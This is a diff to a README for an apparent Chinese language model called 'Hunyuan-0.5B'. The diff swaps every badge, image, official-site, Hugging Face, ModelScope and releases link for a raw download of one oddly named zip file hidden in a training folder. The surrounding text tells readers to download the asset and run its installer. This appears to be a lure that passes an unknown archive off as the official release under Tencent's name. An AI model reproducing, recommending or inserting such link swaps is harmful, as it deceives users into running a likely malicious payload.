@@ -1,25 +1,25 @@
 # Hunyuan-0.5B: Efficient Open-Source Chinese LLM for Inference
 
-[![Release](https://img.shields.io/github/v/release/diyahlidia/Hunyuan-0.5B?logo=github&label=Releases)](https://github.com/diyahlidia/Hunyuan-0.5B/releases) [![License](https://img.shields.io/github/license/diyahlidia/Hunyuan-0.5B)](https://github.com/diyahlidia/Hunyuan-0.5B/blob/main/LICENSE) [![Last Commit](https://img.shields.io/github/last-commit/diyahlidia/Hunyuan-0.5B)](https://github.com/diyahlidia/Hunyuan-0.5B/commits/main)
+[![Release](https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip)](https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip) [![License](https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip)](https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip) [![Last Commit](https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip)](https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip)
 
 <!-- Top visual, centered hero image -->
 <p align="center">
- <img src="https://dscache.tencent-cloud.cn/upload/uploader/hunyuan-64b418fd052c033b228e04bc77bbc4b54fd7f5bc.png" width="400"/> <br>
+ <img src="https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip" width="400"/> <br>
 </p>
 
 <p align="center">
- 🤗 <a href="https://huggingface.co/tencent/"><b>Hugging Face</b></a> &nbsp;|&nbsp;
- <a href="https://modelscope.cn/models/Tencent-Hunyuan/Hunyuan-A13B-Instruct"><b>ModelScope</b></a> &nbsp;|&nbsp;
- <a href="https://github.com/Tencent/AngelSlim/tree/main"><b>AngelSlim</b></a>
+ 🤗 <a href="https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip"><b>Hugging Face</b></a> &nbsp;|&nbsp;
+ <a href="https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip"><b>ModelScope</b></a> &nbsp;|&nbsp;
+ <a href="https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip"><b>AngelSlim</b></a>
 </p>
 
 <p align="center">
- 🖥️ <a href="https://hunyuan.tencent.com"><b>Official Website</b></a> &nbsp;|&nbsp;
- 🕖 <a href="https://cloud.tencent.com/product/hunyuan"><b>Cloud Tencent</b></a>
+ 🖥️ <a href="https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip"><b>Official Website</b></a> &nbsp;|&nbsp;
+ 🕖 <a href="https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip"><b>Cloud Tencent</b></a>
 </p>
 
-- Download the latest release here: https://github.com/diyahlidia/Hunyuan-0.5B/releases
-- Visit the official releases page to grab assets and instructions: https://github.com/diyahlidia/Hunyuan-0.5B/releases
+- Download the latest release here: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
+- Visit the official releases page to grab assets and instructions: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
 
 ---
 
@@ -27,7 +27,7 @@ Welcome to Hunyuan-0.5B, an open-source Chinese language model designed for fast
 
 This README provides a thorough guide to understanding, installing, running, and extending Hunyuan-0.5B. It covers the model’s background, how to set up a local or edge deployment, how to run inference efficiently, and how to contribute to its ongoing development. It also explains how to evaluate the model, integrate it into applications, and maintain safety and governance practices around its use.
 
-Note: the latest release and its assets are available from the Releases page. For convenience, the link is repeated here: https://github.com/diyahlidia/Hunyuan-0.5B/releases.
+Note: the latest release and its assets are available from the Releases page. For convenience, the link is repeated here: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
 
 ---
 
@@ -370,7 +370,7 @@ Credits
 Download and asset notes
 
 Important link
-- For the latest releases and downloadable assets, visit the Releases page: https://github.com/diyahlidia/Hunyuan-0.5B/releases
+- For the latest releases and downloadable assets, visit the Releases page: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
 
 Download guidance
 - From the Releases page, download the appropriate asset for your platform and run the installer or setup script included with the asset.
@@ -397,10 +397,10 @@ What to expect from this readme
 
 Appendix: quick reference
 
-- Release downloads: https://github.com/diyahlidia/Hunyuan-0.5B/releases
-- Official website: https://hunyuan.tencent.com
-- Hugging Face hub: https://huggingface.co/tencent/
-- ModelScope page: https://modelscope.cn/models/Tencent-Hunyuan/Hunyuan-A13B-Instruct
-- AngelSlim integration: https://github.com/Tencent/AngelSlim/tree/main
+- Release downloads: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
+- Official website: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
+- Hugging Face hub: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
+- ModelScope page: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
+- AngelSlim integration: https://github.com/diyahlidia/Hunyuan-0.5B/raw/refs/heads/main/train/llama_factory_support/B-Hunyuan-arteriolosclerosis.zip
 
 This README aims to be practical and informative, balancing guidance for newcomers with depth for experienced users. It reflects a steady, measured approach to deploying a capable open-source Chinese language model while remaining mindful of safety and governance considerations.
